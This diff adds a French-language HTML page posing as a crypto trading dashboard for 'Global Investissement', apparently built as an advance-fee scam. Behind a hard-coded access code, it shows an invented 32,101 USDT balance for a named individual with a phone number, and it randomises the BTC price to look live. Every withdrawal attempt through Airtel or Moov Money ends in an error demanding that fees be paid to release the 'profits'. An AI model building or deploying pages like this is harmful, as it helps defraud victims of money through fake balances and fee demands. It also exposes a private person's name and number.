@@ -1,0 +1,358 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Interface de Trading Crypto - Global Investissement</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #0b0e11;
+            color: #c9d1d9;
+        }
+
+        header {
+            background-color: #21262d;
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 20px;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        header .logo h1 {
+            margin: 0;
+            color: #f0b90b;
+        }
+
+        nav ul {
+            list-style-type: none;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-wrap: wrap;
+        }
+
+        nav ul li {
+            margin-right: 20px;
+        }
+
+        nav ul li a {
+            color: #c9d1d9;
+            text-decoration: none;
+        }
+
+        nav .actions {
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        nav .actions .balance {
+            color: #f0b90b;
+            margin-right: 20px;
+        }
+
+        nav .actions .account-info {
+            margin-right: 20px;
+        }
+
+        nav .actions button {
+            background-color: #f0b90b;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            color: #21262d;
+            font-weight: bold;
+        }
+
+        main {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .trading-interface {
+            display: flex;
+            flex-direction: column;
+            width: 100%;
+            max-width: 1200px;
+        }
+
+        .price-info {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            background-color: #161b22;
+            padding: 20px;
+            border-radius: 5px;
+            margin-bottom: 20px;
+            color: #58a6ff;
+            flex-wrap: wrap;
+        }
+
+        .price-info h2 {
+            margin: 0;
+        }
+
+        .price-info .price {
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .price-info .variation {
+            color: green;
+        }
+
+        #chart_container {
+            height: 400px;
+            background-color: #161b22;
+            margin-bottom: 20px;
+            border-radius: 5px;
+            width: 100%;
+        }
+
+        .order-book {
+            background-color: #161b22;
+            padding: 20px;
+            border-radius: 5px;
+            width: 100%;
+        }
+
+        .order-book h3 {
+            margin-top: 0;
+            color: #58a6ff;
+        }
+
+        .orders .order {
+            display: flex;
+            justify-content: space-between;
+            padding: 5px 0;
+            color: #c9d1d9;
+        }
+
+        .orders .order span {
+            width: 33%;
+            text-align: center;
+        }
+
+        .withdrawal-options {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            width: 100%;
+        }
+
+        .withdrawal-options button {
+            background-color: #f0b90b;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            color: #21262d;
+            font-weight: bold;
+            width: 48%;
+        }
+
+        .error-message {
+            color: red;
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .withdrawal-form {
+            display: none;
+            flex-direction: column;
+            background-color: #161b22;
+            padding: 20px;
+            border-radius: 5px;
+            margin-top: 20px;
+            width: 100%;
+        }
+
+        .withdrawal-form h3 {
+            margin-top: 0;
+            color: #58a6ff;
+        }
+
+        .withdrawal-form .info {
+            margin-bottom: 20px;
+        }
+
+        .withdrawal-form button {
+            background-color: #f0b90b;
+            border: none;
+            padding: 10px;
+            cursor: pointer;
+            color: #21262d;
+            font-weight: bold;
+            align-self: center;
+        }
+
+        footer {
+            background-color: #21262d;
+            color: #c9d1d9;
+            text-align: center;
+            padding: 10px 0;
+        }
+
+        @media (max-width: 768px) {
+            nav ul {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            nav ul li {
+                margin-bottom: 10px;
+            }
+
+            .price-info,
+            .withdrawal-options {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .withdrawal-options button {
+                width: 100%;
+                margin-bottom: 10px;
+            }
+        }
+    </style>
+    <script type="text/javascript" src="https://s3.tradingview.com/tv.js"></script>
+</head>
+
+<body>
+    <script>
+        let code = prompt("Veuillez entrer le code d'accès :");
+        if (code === "2120") {
+            document.body.style.display = 'block';
+        } else {
+            alert("Code incorrect. Accès refusé.");
+            document.body.style.display = 'none';
+        }
+    </script>
+
+    <header>
+        <div class="logo">
+            <h1>Global Investissement</h1>
+        </div>
+        <nav>
+            <ul>
+                <li><a href="#">Marchés</a></li>
+                <li><a href="#">Trade</a></li>
+                <li><a href="#">Futures</a></li>
+                <li><a href="#">Earn</a></li>
+                <li><a href="#">Plus</a></li>
+            </ul>
+            <div class="actions">
+                <span class="balance">Solde: 32 101,000 USDT</span>
+                <div class="account-info">
+                    <span>ANTSOLU MAGLOIRE</span><br>
+                    <span>077147833</span>
+                </div>
+                <button>Déconnexion</button>
+            </div>
+        </nav>
+    </header>
+    <main>
+        <div class="trading-interface">
+            <div class="price-info">
+                <h2>BTC/USDT</h2>
+                <div class="price">67,969.20</div>
+                <div class="variation">+0.17%</div>
+            </div>
+            <div id="chart_container">
+                <div id="tradingview_chart"></div>
+            </div>
+            <div class="order-book">
+                <h3>Order Book</h3>
+                <div class="orders">
+                    <!-- Orders data -->
+                    <div class="order">
+                        <span class="price">67,974.35</span>
+                        <span class="amount">0.19707 BTC</span>
+                        <span class="total">13,395.70515 USDT</span>
+                    </div>
+                    <!-- More orders -->
+                </div>
+            </div>
+            <div class="withdrawal-options">
+                <button id="airtel-money">Retrait via Airtel Money</button>
+                <button id="moov-money">Retrait via Moov Money</button>
+            </div>
+            <div class="withdrawal-form" id="withdrawal-form">
+                <h3>Confirmer le retrait</h3>
+                <div class="info">
+                    <p>Nom: ANTSOLU MAGLOIRE</p>
+                    <p>Numéro: 24177147833</p>
+                </div>
+                <button id="confirm-withdrawal">Valider le Retrait</button>
+            </div>
+            <div class="error-message" id="error-message"></div>
+        </div>
+    </main>
+    <footer>
+        <p>© 2024 Global Investissement. Tous droits réservés.</p>
+    </footer>
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const priceElement = document.querySelector('.price-info .price');
+            const variationElement = document.querySelector('.price-info .variation');
+            const errorMessage = document.getElementById('error-message');
+            const withdrawalForm = document.getElementById('withdrawal-form');
+
+            const updatePrice = () => {
+                const newPrice = (Math.random() * (70000 - 65000) + 65000).toFixed(2);
+                const newVariation = (Math.random() * (2) - 1).toFixed(2);
+                priceElement.textContent = newPrice;
+                variationElement.textContent = `${newVariation}%`;
+                variationElement.style.color = newVariation > 0 ? 'green' : 'red';
+            };
+
+            setInterval(updatePrice, 5000);
+
+            document.getElementById('airtel-money').addEventListener('click', () => {
+                withdrawalForm.style.display = 'flex';
+                errorMessage.textContent = '';
+            });
+
+            document.getElementById('moov-money').addEventListener('click', () => {
+                withdrawalForm.style.display = 'flex';
+                errorMessage.textContent = '';
+            });
+
+            document.getElementById('confirm-withdrawal').addEventListener('click', () => {
+                errorMessage.textContent = 'Erreur : Veuillez régler vos frais pour entrer en possession de vos bénéfices.';
+                withdrawalForm.style.display = 'none';
+            });
+
+            new TradingView.widget({
+                "container_id": "tradingview_chart",
+                "width": "100%",
+                "height": "400px",
+                "symbol": "BINANCE:BTCUSDT",
+                "interval": "D",
+                "timezone": "Etc/UTC",
+                "theme": "dark",
+                "style": "1",
+                "locale": "fr",
+                "toolbar_bg": "#f1f3f6",
+                "enable_publishing": false,
+                "hide_legend": false,
+                "save_image": false,
+                "details": true,
+                "studies": [
+                    "MACD@tv-basicstudies"
+                ],
+                "show_popup_button": true,
+                "popup_width": "1000",
+                "popup_height": "650"
+            });
+        });
+    </script>
+</body>
+
+</html>
